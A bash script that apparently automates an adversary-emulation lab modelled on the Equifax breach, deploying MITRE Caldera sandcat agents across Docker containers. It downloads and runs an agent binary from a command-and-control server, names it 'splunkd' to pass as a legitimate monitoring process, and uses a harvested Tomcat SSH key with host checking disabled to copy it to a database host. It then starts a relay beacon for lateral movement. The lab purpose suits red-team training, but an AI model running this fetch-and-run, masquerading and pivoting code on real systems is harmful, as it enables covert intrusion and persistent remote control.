#!/usr/bin/env bash
set -euo pipefail

# Auto-load .env from the project root (if not already set in the shell)
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
ENV_FILE="$SCRIPT_DIR/../.env"
if [[ -f "$ENV_FILE" ]]; then
  set -o allexport
  # shellcheck disable=SC1090
  source "$ENV_FILE"
  set +o allexport
fi

# Validate required environment variables
: "${CALDERA_API_KEY:?CALDERA_API_KEY not set — add it to .env or export manually}"

# ==========================================
# Variable definitions
# ==========================================
WS="equifax-seg-webserver-1"
DB_IP="192.168.1.100"
WS_INT="192.168.1.2"
RELAY_GROUP="10.0.0.2"
DB_GROUP="192.168.1.100"
SERVER="http://host.docker.internal:8888"
KEY_OPT="-o StrictHostKeyChecking=no -i /opt/tomcat/.ssh/id_rsa"

# ==========================================
# Step 1: Deploy the relay agent on the webserver
# ==========================================
echo "[1/6] (re)deploy relay on webserver (with proxy_http extension)..."
docker exec "$WS" bash -c "
  pkill splunkd 2>/dev/null || true
  sleep 1

  curl -s -X POST \
    -H 'file:sandcat.go' \
    -H 'platform:linux' \
    -H 'gocat-extensions:proxy_http' \
    '$SERVER/file/download' > /tmp/splunkd

  chmod +x /tmp/splunkd

  nohup /tmp/splunkd -server '$SERVER' -group '$RELAY_GROUP' -listenP2P >/tmp/sandcat.log 2>&1 </dev/null &
  echo 'relay-started'
"

# ==========================================
# Step 2: Discover the P2P listening port
# ==========================================
echo "[2/6] discover actual P2P port directly from webserver process (not Caldera, avoids stale records)..."
PORT=""
for i in $(seq 1 20); do
  PORT=$(docker exec "$WS" bash -c "
    netstat -tlnp 2>/dev/null \
      | grep -E 'rosetta|splunkd' \
      | awk '{print \$4}' \
      | grep -oE '[0-9]+$' \
      | grep -v '^8080$\|^8005$\|^8009$' \
      | head -1
  ")
  [ -n "$PORT" ] && break
  sleep 2
done

[ -z "$PORT" ] && { 
  echo "ERROR: no P2P port advertised; check /tmp/sandcat.log on webserver"
  exit 1 
}
echo "    P2P port = $PORT"

# ==========================================
# Step 3: Copy the binary to the database container
# ==========================================
echo "[3/6] scp binary to DB via SSH jumphost..."
docker exec "$WS" bash -c "scp $KEY_OPT /tmp/splunkd database@$DB_IP:/tmp/splunkd"

# ==========================================
# Step 4: Start the database agent (pointed at the relay)
# ==========================================
echo "[4/6] start DB agent pointed at relay $WS_INT:$PORT..."
docker exec "$WS" bash -c "
  ssh $KEY_OPT database@$DB_IP \"
    pkill splunkd 2>/dev/null || true
    sleep 1
    chmod +x /tmp/splunkd
    nohup /tmp/splunkd -server 'http://$WS_INT:$PORT' -group '$DB_GROUP' >/tmp/sandcat.log 2>&1 </dev/null &
    echo 'db-started'
  \"
"

# ==========================================
# Step 5: Wait for the agent to come online
# ==========================================
echo "[5/6] wait for DB agent to beacon through relay..."
sleep 8

# ==========================================
# Step 6: Prune stale agent records from the two relay groups
# ==========================================
echo "[6/6] prune dead paws in the two relay groups (keeps newest per group; never touches other groups)..."
curl -s -H "KEY: $CALDERA_API_KEY" http://localhost:8888/api/v2/agents | python3 -c "
import json, sys
ags = [a for a in json.load(sys.stdin) if a.get('group') in ('$RELAY_GROUP', '$DB_GROUP')]
keep = {}
for a in ags:
    g = a['group']
    if g not in keep or a['last_seen'] > keep[g]['last_seen']:
        keep[g] = a
for a in ags:
    if a['paw'] != keep[a['group']]['paw']:
        print(a['paw'])
" | while read -r paw; do
echo -n "  delete dead $paw -> "
curl -s -o /dev/null -w "%{http_code}\n" -X DELETE -H "KEY: $CALDERA_API_KEY" "http://localhost:8888/api/v2/agents/$paw"
done

# ==========================================
# Final check: each group should have exactly one live agent
# ==========================================
echo "=== final agents in relay groups ==="
curl -s -H "KEY: $CALDERA_API_KEY" http://localhost:8888/api/v2/agents | python3 -c "
import json, sys
for a in json.load(sys.stdin):
    if a.get('group') in ('$RELAY_GROUP', '$DB_GROUP'):
        print(a['paw'], a.get('group'), a['username'], a.get('last_seen'))
"

# ==========================================
# Usage:
#   export CALDERA_API_KEY=...
#   chmod +x equifax/redeploy_relay.sh
#   ./equifax/redeploy_relay.sh
# ==========================================